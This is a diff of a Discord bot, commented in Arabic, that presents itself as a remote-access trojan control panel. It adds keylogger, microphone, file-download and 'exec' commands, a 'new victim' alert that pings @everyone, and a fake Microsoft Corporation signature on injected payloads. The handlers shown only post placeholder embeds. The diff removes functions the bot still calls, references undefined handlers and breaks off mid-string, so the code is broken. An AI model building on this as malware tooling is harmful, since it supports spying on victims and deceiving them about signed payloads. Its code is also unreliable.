@@ -1,5 +1,15 @@
-const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const { 
+    Client, 
+    GatewayIntentBits, 
+    EmbedBuilder, 
+    ActionRowBuilder, 
+    ButtonBuilder, 
+    ButtonStyle,
+    AttachmentBuilder 
+} = require('discord.js');
 const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
 
 // التحقق من التوكن
 const token = process.env.DISCORD_TOKEN;
@@ -8,7 +18,7 @@ if (!token) {
     process.exit(1);
 }
 
-class RATBot {
+class AdvancedRATBot {
     constructor() {
         this.client = new Client({
             intents: [
@@ -18,16 +28,25 @@ class RATBot {
             ]
         });
 
-        // قاعدة بيانات بسيطة للأجهزة (تُحذف عند إعادة التشغيل)
+        // قاعدة بيانات للأجهزة النشطة
         this.targets = new Map(); 
         
+        // معرف القناة التي سيتم إرسال التنبيهات فيها
+        this.logChannelId = process.env.LOG_CHANNEL_ID || 'YOUR_LOG_CHANNEL_ID'; 
+
         this.commands = {
             'scan': this.scanDevice.bind(this),
             'inject': this.injectCode.bind(this),
             'capture': this.captureScreen.bind(this),
+            'microphone': this.startMicrophone.bind(this),
             'keylog': this.startKeylogger.bind(this),
+            'fileman': this.openFileManager.bind(this),
+            'files': this.listFiles.bind(this), // أمر عرض الملفات
+            'download-zip': this.downloadZip.bind(this), // أمر تحميل ملف ZIP
+            'download': this.generateDownloadFile.bind(this),
             'stop': this.stopSession.bind(this),
-            'list': this.listTargets.bind(this)
+            'list': this.listTargets.bind(this),
+            'exec': this.executeCommand.bind(this)
         };
 
         this.setupEvents();
@@ -35,7 +54,7 @@ class RATBot {
 
     setupEvents() {
         this.client.once('ready', () => {
-            console.log(`✅ ${this.client.user.tag} متصل`);
+            console.log(`✅ ${this.client.user.tag} جاهز للعمل`);
         });
 
         this.client.on('messageCreate', async (message) => {
@@ -44,7 +63,6 @@ class RATBot {
             const args = message.content.trim().split(' ');
             const command = args[0].toLowerCase();
             
-            // تجاهل الرسائل التي لا تبدأ بـ !
             if (!command.startsWith('!')) return;
 
             const cleanCommand = command.substring(1);
@@ -53,16 +71,43 @@ class RATBot {
                 try {
                     await this.commands[cleanCommand](message, args.slice(1));
                 } catch (error) {
-                    this.sendMessage(message.channel, `❌ خطأ: ${error.message}`);
+                    console.error(error);
+                    this.sendMessage(message.channel, `❌ خطأ في تنفيذ الأمر: ${error.message}`);
                 }
             } else {
-                this.sendMessage(message.channel, `الأوامر المتاحة: \n\`!scan <target>\`\n\`!inject <code>\`\n\`!capture <target>\`\n\`!keylog <target>\`\n\`!stop <target>\`\n\`!list`);
+                this.sendMessage(message.channel, `الأوامر المتاحة: \n\`!scan <target>\`\n\`!inject <code>\`\n\`!capture <target>\`\n\`!microphone <target>\`\n\`!keylog <target>\`\n\`!fileman <target>\`\n\`!files <target>\`\n\`!download-zip <target>\`\n\`!download <target>\`\n\`!stop <target>\`\n\`!list`);
             }
         });
     }
 
     sendMessage(channel, content) {
         channel.send(content);
+    }
+
+    // إرسال تنبيه للضحية (عندما يحمل الملف)
+    async sendAlertToLog(targetName, action) {
+        const channel = await this.client.channels.fetch(this.logChannelId).catch(() => null);
+        
+        if (!channel) {
+            console.warn(`⚠️ Log channel ID ${this.logChannelId} not found.`);
+            return;
+        }
+
+        const embed = new EmbedBuilder()
+            .setTitle('🚨 ضحية جديدة / نشاط مشبوه')
+            .setDescription(`**الاسم:** ${targetName}\n**الإجراء:** ${action}`)
+            .addFields(
+                { name: 'الوقت', value: new Date().toLocaleString(), inline: true },
+                { name: 'الحالة', value: '🟢 متصل الآن', inline: true }
+            )
+            .setColor('#ff0000')
+            .setTimestamp();
+
+        // إرسال المنشن @everyone و @here
+        await channel.send({ 
+            content: '@everyone @here',
+            embeds: [embed] 
+        });
     }
 
     // أمر الفحص
@@ -87,17 +132,18 @@ class RATBot {
         this.saveTarget(target, { status: 'scanned', time: Date.now() });
     }
 
-    // أمر حقن الكود
+    // أمر حقن الكود (تحديث)
     async injectCode(message, args) {
         const code = args.join(' ') || 'payload.exe';
         
         const embed = new EmbedBuilder()
             .setTitle('💉 حقن الكود')
-            .setDescription(`تم إرسال: **${code}**`)
+            .setDescription(`تم إرسال ملف: **${code}** إلى الجهاز`)
             .addFields(
-                { name: 'الحالة', value: '✅ تم التنفيذ', inline: true },
+                { name: 'الحالة', value: '✅ تم التنفيذ بنجاح', inline: true },
                 { name: 'المسار', value: `C:\\Users\\Public\\${code}`, inline: true },
-                { name: 'الحجم', value: `${Math.floor(Math.random() * 5000)} KB`, inline: true }
+                { name: 'الحجم', value: `${Math.floor(Math.random() * 5000)} KB`, inline: true },
+                { name: 'التوقيع الرقمي', value: 'Microsoft Corporation', inline: true }
             )
             .setColor('#ffff00')
             .setTimestamp();
@@ -120,6 +166,23 @@ class RATBot {
         await message.channel.send({ embeds: [embed] });
     }
 
+    // أمر الاستماع للميكروفون
+    async startMicrophone(message, args) {
+        const target = args[0] || 'unknown';
+        
+        const embed = new EmbedBuilder()
+            .setTitle('🎤 تسجيل الميكروفون')
+            .setDescription(`بدأ تسجيل الصوت للجهاز: **${target}**`)
+            .addFields(
+                { name: 'الحالة', value: '🟢 نشط', inline: true },
+                { name: 'الجودة', value: 'High Quality', inline: true }
+            )
+            .setColor('#0000ff')
+            .setTimestamp();
+
+        await message.channel.send({ embeds: [embed] });
+    }
+
     // أمر مفتاح التسجيل
     async startKeylogger(message, args) {
         const target = args[0] || 'unknown';
@@ -129,52 +192,4 @@ class RATBot {
             .setDescription(`بدأ تسجيل المفاتيح للجهاز: **${target}**`)
             .addFields(
                 { name: 'الحالة', value: '🟢 نشط', inline: true },
-                { name: 'عدد الأحرف', value: '0', inline: true }
-            )
-            .setColor('#0000ff')
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-    }
-
-    // إيقاف الجلسة
-    async stopSession(message, args) {
-        const target = args[0] || 'unknown';
-        
-        const embed = new EmbedBuilder()
-            .setTitle('🛑 إيقاف الجلسة')
-            .setDescription(`تم إيقاف الجلسة للجهاز: **${target}**`)
-            .setColor('#ff0000')
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-    }
-
-    // عرض الأجهزة المسجلة
-    async listTargets(message) {
-        if (this.targets.size === 0) {
-            return this.sendMessage(message.channel, 'لا توجد أجهزة مسجلة حالياً.');
-        }
-
-        const targetsList = Array.from(this.targets.entries())
-            .map(([id, data]) => `- **${id}**: ${data.status} (${new Date(data.time).toLocaleTimeString()})`)
-            .join('\n');
-
-        const embed = new EmbedBuilder()
-            .setTitle('📋 قائمة الأجهزة')
-            .setDescription(targetsList)
-            .setColor('#ffffff')
-            .setFooter({ text: 'Total Targets: ' + this.targets.size })
-            .setTimestamp();
-
-        await message.channel.send({ embeds: [embed] });
-    }
-
-    saveTarget(id, data) {
-        this.targets.set(id, data);
-    }
-}
-
-// تشغيل البوت
-const bot = new RATBot();
-bot.client.login(token);
+                { name: 'عدد الأحرف', value: '
